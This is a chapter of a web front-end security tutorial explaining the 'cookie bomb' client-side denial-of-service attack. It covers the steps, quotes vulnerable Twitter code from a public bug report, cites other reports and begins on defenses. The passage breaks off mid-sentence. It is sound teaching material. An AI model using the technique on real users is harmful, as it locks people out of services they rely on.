<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-ch4/cookie-bomb" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.3">
<title data-rh="true">Interesting and Practical Cookie Bomb | Beyond XSS</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://aszx87410.github.io/beyond-xss/en/img/cover.png"><meta data-rh="true" name="twitter:image" content="https://aszx87410.github.io/beyond-xss/en/img/cover.png"><meta data-rh="true" property="og:url" content="https://aszx87410.github.io/beyond-xss/en/ch4/cookie-bomb/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="google-site-verification" content="O7SjDEO9AQXbxqBWhtUW0FVahHxSrnweMXJxLICpSz4"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Interesting and Practical Cookie Bomb | Beyond XSS"><meta data-rh="true" name="description" content="In the previous post, we learned about cookie tossing, which allows us to manipulate other same-site domains by writing cookies. In this post, we will introduce another attack technique that utilizes cookies called cookie bomb. It is a client-side DoS attack caused by cookies."><meta data-rh="true" property="og:description" content="In the previous post, we learned about cookie tossing, which allows us to manipulate other same-site domains by writing cookies. In this post, we will introduce another attack technique that utilizes cookies called cookie bomb. It is a client-side DoS attack caused by cookies."><link data-rh="true" rel="icon" href="/beyond-xss/en/img/logo.png"><link data-rh="true" rel="canonical" href="https://aszx87410.github.io/beyond-xss/en/ch4/cookie-bomb/"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/en/ch4/cookie-bomb/" hreflang="en"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/ch4/cookie-bomb/" hreflang="zh-TW"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/ja/ch4/cookie-bomb/" hreflang="ja"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/ch4/cookie-bomb/" hreflang="x-default"><link rel="stylesheet" href="/beyond-xss/en/assets/css/styles.32fcb3bb.css">
<link rel="preload" href="/beyond-xss/en/assets/js/runtime~main.222f121e.js" as="script">
<link rel="preload" href="/beyond-xss/en/assets/js/main.56058cb3.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/beyond-xss/en/"><div class="navbar__logo"><img src="/beyond-xss/en/img/logo.png" alt="logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/beyond-xss/en/img/logo.png" alt="logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Beyond XSS: Explore the Web Front-end Security Universe</b></a></div><div class="navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>English</a><ul class="dropdown__menu"><li><a href="/beyond-xss/en/ch4/cookie-bomb/" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="en">English</a></li><li><a href="/beyond-xss/ch4/cookie-bomb/" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="zh-TW">中文（台灣）</a></li><li><a href="/beyond-xss/ja/ch4/cookie-bomb/" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="ja">日本語</a></li></ul></div><a href="https://github.com/aszx87410/beyond-xss" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/en/">About This Series</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link">Chapter 1: Starting with XSS</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch1/browser-security-model/">Browser Security Model</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch1/xss-introduction/">Starting with XSS for Frontend Security</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch1/know-xss-a-bit-more/">Understanding XSS a Bit More</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch1/javascript-protocol/">Dangerous javascript: pseudo protocol</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link">Chapter 2: Defense and bypass for XSS </a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch2/xss-defense-sanitization/">The First Line of Defense Against XSS: Sanitization</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch2/xss-defense-csp/">The Second Line of Defense Against XSS: CSP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch2/token-storage/">The Third Line of Defense against XSS: Reducing the Impact Scope</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch2/trust-types/">Latest XSS Defense: Trusted Types and Built-in Sanitizer API</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch2/csp-bypass/">Bypassing Your Defenses: Common CSP Bypasses</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch2/mutation-xss/">Bypassing Your Defense: Mutation XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch2/universal-xss/">The Most Powerful XSS: Universal XSS</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link">Chapter 3: Attacks without JavaScript  </a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch3/attack-without-js/">Who says you have to execute JavaScript directly to attack?</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch3/prototype-pollution/">Prototype Pollution: Exploiting the Prototype Chain</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch3/dom-clobbering/">Can HTML affect JavaScript? Introduction to DOM clobbering</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch3/csti/">Template Injection in Frontend: CSTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch3/css-injection/">CSS Injection: Attacking with Just CSS (Part 1)</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch3/css-injection-2/">CSS Injection: Attacking with Just CSS (Part 2)</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch3/html-attack/">Can You Attack with Just HTML?</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--active">Chapter 4: Cross-site attacks </a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch4/sop-and-site/">The Essence: Same-origin Policy and Site</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch4/cors-intro/">Introduction to Cross-Origin Resource Sharing (CORS)</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch4/cors-attack/">Cross-Origin Security Issues</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch4/csrf/">Cross-Site Request Forgery (CSRF) Made Easy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch4/same-site-cookie/">Same-site cookie, the savior of CSRF?</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch4/subdomain/">From same-site to main site</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/beyond-xss/en/ch4/cookie-bomb/">Interesting and Practical Cookie Bomb</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link">Chapter 5: Other interesting topics  </a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch5/clickjacking/">What You See Is Not What You Get: Clickjacking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch5/mime-sniffing/">Exploiting MIME Sniffing</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch5/supply-chain-attack/">Frontend Supply Chain Attacks: Attacking Downstream from Upstream</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch5/web3-attacks/">Web Frontend Attacks in Web3</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch5/xsleaks-1/">The Most Interesting Frontend Side-Channel Attack: XSLeaks (Part 1)</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/en/ch5/xsleaks-2/">The Most Interesting Frontend Side Channel Attack: XSLeaks (Part 2)</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/en/summary/">Conclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/en/contact/">Contact the Author</a></li></ul></nav></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/beyond-xss/en/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Chapter 4: Cross-site attacks </span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Interesting and Practical Cookie Bomb</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Interesting and Practical Cookie Bomb</h1><p>In the previous post, we learned about cookie tossing, which allows us to manipulate other same-site domains by writing cookies. In this post, we will introduce another attack technique that utilizes cookies called cookie bomb. It is a client-side DoS attack caused by cookies.</p><p>When we talk about DoS, we might think about sending a large number of packets to a website, overwhelming the server and causing it to be unresponsive or run out of resources. We might also think of DDoS (Distributed Denial-of-Service), where multiple hosts send packets simultaneously to a server, causing it to crash.</p><p>DoS and DDoS attacks actually operate at different layers. These layers correspond to the OSI model that you may have learned about. The attacks we usually think of are more like attacks at the L3 network layer and L4 transport layer. However, cookie bomb is a DoS attack that exists at the L7 application layer.</p><p>For example, let&#x27;s say a website has an API for querying data, and it has a <code>_limit</code> parameter to specify how many records should be return, the default value is 100. But when I change it to 10000, I notice that the server takes over a minute to respond. So, I start sending a request every two seconds. As I continue sending these requests, I observe that the website becomes slower and eventually crashes, returning a 500 Internal Server Error. This is an example of a DoS attack at the application layer.</p><p>Any method that prevents users from accessing a website can be considered a DoS attack. The method we have discovered is based on the L7 application layer, making it an L7 DoS attack.</p><p>Among the various L7 DoS attack techniques, there is one that I find particularly interesting, and that is the cookie bomb.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction-to-cookie-bomb">Introduction to Cookie Bomb<a href="#introduction-to-cookie-bomb" class="hash-link" aria-label="Direct link to Introduction to Cookie Bomb" title="Direct link to Introduction to Cookie Bomb">​</a></h2><p>To execute a cookie bomb attack, the prerequisite is the ability to write cookies. There are basically two ways to achieve this. The first way is by exploiting the logic of the website itself.</p><p>For example, let&#x27;s say there is a page <code>https://example.com/log?uid=abc</code>. When you visit this page, it writes <code>uid=abc</code> to a cookie. So, if you change the URL to <code>?uid=xxxxxxxxxx</code>, it will write <code>xxxxxxxxxx</code> to the cookie. This is one way.</p><p>The other way is the one mentioned in the previous post, where you gain control of a subdomain and can execute JavaScript code. This can be achieved through subdomain takeover or other methods.</p><p>Once you can write arbitrary cookies, what can you do with them? You can start writing a bunch of garbage into them.</p><p>For example, <code>a1=o....*4000</code>, which means writing a lot of meaningless content into the cookie. Here, it is important to note that a cookie can have a size of approximately 4KB, and we need at least two cookies, which means we need to write 8KB of data to achieve the attack.</p><p>After you write these cookies, when you return to the homepage <code>https://example.com</code>, according to the nature of cookies, all these garbage cookies will be sent to the server, right? Now comes the moment of witnessing the miracle.</p><p>Instead of displaying the usual page, the server responds with an error: <code>431 Request Header Fields Too Large</code>.</p><p><img loading="lazy" src="/beyond-xss/en/assets/images/26-01-9e9e072354b015f68c2f47b0a79cdbbc.png" width="1557" height="797" class="img_ev3q"></p><p>Among the various HTTP status codes, there are two related to a request being too large:</p><ol><li>413 Payload Too Large</li><li>431 Request Header Fields Too Large</li></ol><p>For example, if you fill out a form with a million characters and send it to the server, you will likely receive a <code>413 Payload Too Large</code> response. As the error message suggests, the payload is too large for the server to handle.</p><p>The same applies to headers. When you have too many cookies, the <code>Cookie</code> field in the request header becomes large, so large that the server cannot handle it, resulting in a <code>431 Request Header Fields Too Large</code> response (although, based on testing, some servers may respond with different codes depending on their implementation, such as Microsoft responding with 400 bad request).</p><p>Therefore, if we can overload a user&#x27;s cookies, we can make them see this error page and prevent them from accessing the service properly. This is the cookie bomb, a DoS attack caused by a large number of cookies. The underlying principle is that &quot;when a browser visits a webpage, it automatically sends the corresponding cookies along with it.&quot;</p><p>The term &quot;cookie bomb&quot; originated from a blog post titled <a href="http://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html" target="_blank" rel="noopener noreferrer">Cookie Bomb or let&#x27;s break the Internet</a> published by Egor Homakov on January 18, 2014. However, similar attack techniques had already appeared in 2009: <a href="http://sirdarckcat.blogspot.com/2009/04/how-to-use-google-analytics-to-dos.html" target="_blank" rel="noopener noreferrer">How to use Google Analytics to DoS a client from some website</a>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="attack-process">Attack Process<a href="#attack-process" class="hash-link" aria-label="Direct link to Attack Process" title="Direct link to Attack Process">​</a></h2><p>As mentioned above, let&#x27;s assume that we have discovered a URL <code>https://example.com/log?uid=abc</code> that allows us to set arbitrary cookies. The next steps are as follows:</p><ol><li>Find a way to write a cookie larger than 8KB (as many server limitations are around 8KB).</li><li>Pass this URL to the target of the attack and find a way to make them click on it.</li><li>The target clicks on the URL and sets a very large cookie in their browser.</li><li>The target visits the website <code>https://example.com</code> and finds that they cannot see any content, only a blank page or an error message. The attack is successful.</li></ol><p>In this situation, unless the user changes their browser or the cookie expires, or manually clears the cookie, they will always be in this state.</p><p>To summarize, this attack can only target specific users and requires two prerequisites:</p><ol><li>Finding a place where arbitrary cookies can be set.</li><li>The target must click on the URL found in step one.</li></ol><p>Now let&#x27;s look at a few real-world examples. The first one is a vulnerability reported by filedescriptor to Twitter in 2015: <a href="https://hackerone.com/reports/57356" target="_blank" rel="noopener noreferrer">DOM based cookie bomb</a>.</p><p>He found the following code on the Twitter website:</p><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">d</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> b </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">referrer</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;none&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            d </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ev_redir_&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">encodeURIComponent</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;=&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> b </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;; path=/&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token dom variable" style="color:#36acaa">window</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">location</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">hash</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">d</span><span class="token punctuation" style="color:#393A34">(</span><span class="token dom variable" style="color:#36acaa">window</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">location</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">hash</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">toLowerCase</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It can be seen that the data from the URL hash and <code>document.referrer</code> are placed in the cookie, and <code>document.referrer</code> is not encoded at all. Therefore, it is possible to write arbitrary cookies using this vulnerability. By exploiting the <code>document.referrer</code>, a very long cookie can be written, causing a Denial of Service (DoS) attack.</p><p>When a user clicks on the cookie bomb link, they will see an error page when they visit Twitter.</p><p>The second example is a vulnerability reported by s_p_q_r to Shopify in 2015: <a href="https://hackerone.com/reports/105363" target="_blank" rel="noopener noreferrer">[livechat.shopify.com] Cookie bomb at customer chats</a>. In this case, the frontend code directly uses the information from the URL as the content of the cookie. Before writing it, the content is encoded. For example, <code>,</code> becomes <code>%2C</code>, tripling the length. Therefore, by passing a very long URL, a cookie bomb can be created.</p><p>The last example is a vulnerability reported by bihari_web to NordVPN in 2020: <a href="https://hackerone.com/reports/777984" target="_blank" rel="noopener noreferrer">Denial of Service with Cookie Bomb</a>.</p><p>Similar to the previous two cases, it was discovered that the information from the URL (such as the path or a specific query string) is extracted and written into the cookie without any length limitation. Therefore, a cookie bomb can be created by using a very long URL.</p><p>Before continuing to discuss the attack surface, let&#x27;s first mention some defense measures.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="defense-measures">Defense Measures<a href="#defense-measures" class="hash-link" aria-label="Direct link to Defense Measures" title="Direct link to Defense Measures">​</a></h2><p>The first point is not to trust user input. For example, in the mentioned example: <code>https://example.com/log?uid=abc</code>, <code>abc</code> should not be directly written into the cookie. Instead, basic checks such as format or length should be performed to prevent this type of attack.</p><p>Next, when I mentioned setting cookies from a subdomain to a root domain, many people might think of one thing: &quot;What about shared subdomains?&quot;</p><p>For example, with the GitHub Pages feature, each person&#x27;s domain is <code>username.github.io</code>. So, can&#x27;t I create a cookie bomb that affects all GitHub Pages? I can simply create a malicious HTML page on my 